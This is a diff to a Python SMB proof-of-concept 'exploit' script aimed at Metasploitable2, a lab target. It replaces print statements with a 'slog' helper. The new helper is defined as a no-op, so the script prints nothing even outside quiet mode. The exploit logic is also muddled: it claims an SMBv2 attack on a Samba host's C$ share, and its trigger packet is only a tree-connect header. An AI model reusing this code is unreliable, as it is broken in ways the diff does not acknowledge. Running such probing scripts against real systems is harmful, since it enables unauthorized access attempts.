@@ -469,7 +469,7 @@ class SMBConnection:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.settimeout(10)
         self.sock.connect((self.host, self.port))
-        print(f"[+] Connected to Metasploitable2 at {self.host}:{self.port}")
+        slog(f"[+] Connected to Metasploitable2 at {self.host}:{self.port}")
         return True
     
     def send_packet(self, packet):
@@ -507,7 +507,7 @@ class SMBConnection:
         """Close connection"""
         if self.sock:
             self.sock.close()
-            print("[-] Connection closed")
+            slog("[-] Connection closed")
 
 # ============================================================================
 # Metasploitable2 Exploit Functions
@@ -515,7 +515,7 @@ class SMBConnection:
 
 def negotiate_protocol(conn):
     """Negotiate SMB2 protocol with Metasploitable2"""
-    print("[*] Negotiating SMB2 protocol...")
+    slog("[*] Negotiating SMB2 protocol...")
     
     # Create SMB2 negotiate request
     negotiate_request = create_smb2_header(SMB2_CMD_NEGOTIATE)
@@ -526,13 +526,13 @@ def negotiate_protocol(conn):
     response = conn.recv_packet()
     
     if response:
-        print("[+] SMB2 negotiate response received")
+        slog("[+] SMB2 negotiate response received")
         return True
     return False
 
 def send_tree_connect(conn):
     """Send Tree Connect request to Metasploitable2"""
-    print("[*] Sending Tree Connect request...")
+    slog("[*] Sending Tree Connect request...")
     
     # Create tree connect request for C$
     tree_connect = create_tree_connect_request(path=b'C$')
@@ -542,13 +542,13 @@ def send_tree_connect(conn):
     response = conn.recv_packet()
     
     if response:
-        print("[+] Tree Connect response received")
+        slog("[+] Tree Connect response received")
         return True
     return False
 
 def send_session_setup(conn):
     """Send Session Setup request (with anonymous login)"""
-    print("[*] Sending Session Setup request (anonymous login)...")
+    slog("[*] Sending Session Setup request (anonymous login)...")
     
     # Create session setup request with anonymous login
     session_setup = create_session_setup_request(auth_type=1, capabilities=0x0002)
@@ -558,20 +558,20 @@ def send_session_setup(conn):
     response = conn.recv_packet()
     
     if response:
-        print("[+] Session Setup response received")
+        slog("[+] Session Setup response received")
         # Check status
         status = struct.unpack('<I', response[40:44])[0]
         if status == STATUS_OK:
-            print("[+] Session established successfully")
+            slog("[+] Session established successfully")
         else:
-            print(f"[-] Session failed with status: 0x{status:08x}")
+            slog(f"[-] Session failed with status: 0x{status:08x}")
             return False
         return True
     return False
 
 def send_echo(conn):
     """Send SMB2 Echo request"""
-    print("[*] Sending SMB2 Echo request...")
+    slog("[*] Sending SMB2 Echo request...")
     
     echo = create_echo_request(data=b'ping')
     echo += b'\x00' * (64 - len(echo) % 64)  # Padding
@@ -580,13 +580,13 @@ def send_echo(conn):
     response = conn.recv_packet()
     
     if response:
-        print("[+] SMB2 Echo response received")
+        slog("[+] SMB2 Echo response received")
         return True
     return False
 
 def send_tree_disconnect(conn):
     """Send Tree Disconnect request"""
-    print("[*] Sending Tree Disconnect request...")
+    slog("[*] Sending Tree Disconnect request...")
     
     disconnect = create_tree_disconnect_request()
     disconnect += b'\x00' * (64 - len(disconnect) % 64)  # Padding
@@ -595,13 +595,13 @@ def send_tree_disconnect(conn):
     response = conn.recv_packet()
     
     if response:
-        print("[+] Tree Disconnect response received")
+        slog("[+] Tree Disconnect response received")
         return True
     return False
 
 def send_logoff(conn):
     """Send SMB2 Logoff request"""
-    print("[*] Sending SMB2 Logoff request...")
+    slog("[*] Sending SMB2 Logoff request...")
     
     logoff = create_logoff_request()
     logoff += b'\x00' * (64 - len(logoff) % 64)  # Padding
@@ -610,13 +610,13 @@ def send_logoff(conn):
     response = conn.recv_packet()
     
     if response:
-        print("[+] Logoff response received")
+        slog("[+] Logoff response received")
         return True
     return False
 
 def trigger_exploit(conn):
     """Trigger the SMBv2 exploit"""
-    print("[*] Triggering the exploit...")
+    slog("[*] Triggering the exploit...")
     
     # Create a payload to trigger the vulnerability
     packet = create_smb2_header(SMB2_CMD_TREE_CONNECT)
@@ -626,19 +626,23 @@ def trigger_exploit(conn):
     response = conn.recv_packet()
     
     if response:
-        print("[+] Exploit packet sent successfully")
+        slog("[+] Exploit packet sent successfully")
         # Check for error response
         status = struct.unpack('<I', response[40:44])[0]
         if status == STATUS_OK:
-            print("[+] Connection successful (no exploit triggered)")
+            slog("[+] Connection successful (no exploit triggered)")
         else:
-            print(f"[!] Response status: 0x{status:08x}")
+            slog(f"[!] Response status: 0x{status:08x}")
         return True
     return False
 
 # ============================================================================
 # Main
 # ============================================================================
+
+def slog(*args, **kwargs):
+    """Logging function - silenced in quiet mode."""
+    pass
 
 def main():
     """Main function"""
@@ -656,17 +660,18 @@ def main():
     
     args = parser.parse_args()
     
+    # Setup logging - use global slog
     if args.quiet:
-        # Disable all output
-        def print(*args, **kwargs):
+        # Disable all output - redefines slog to be a no-op
+        global slog
+        def slog(*args, **kwargs):
             pass
-    else:
-        # Enable output
-        def print(*args, **kwargs):
-            print(f"[*] {args[0]}", *args[1:], **kwargs)
+    import sys
+    output = sys.stdout
+    error_output = sys.stderr
     
-    print(f"[*] Metasploitable2 SMB PoC")
-    print(f"[*] Target: {args.host}:{args.port}")
+    slog("[*] Metasploitable2 SMB PoC")
+    slog(f"[*] Target: {args.host}:{args.port}")
     
     # Create connection
     conn = SMBConnection(args.host, args.port)
@@ -686,10 +691,10 @@ def main():
         # Trigger exploit
         trigger_exploit(conn)
         
-        print("[*] Metasploitable2 SMB PoC completed")
+        slog("[*] Metasploitable2 SMB PoC completed")
         
     except Exception as e:
-        print(f"[-] Error: {e}")
+        slog(f"[-]", f"Error: {e}", file=sys.stderr)
     finally:
         conn.close()
 
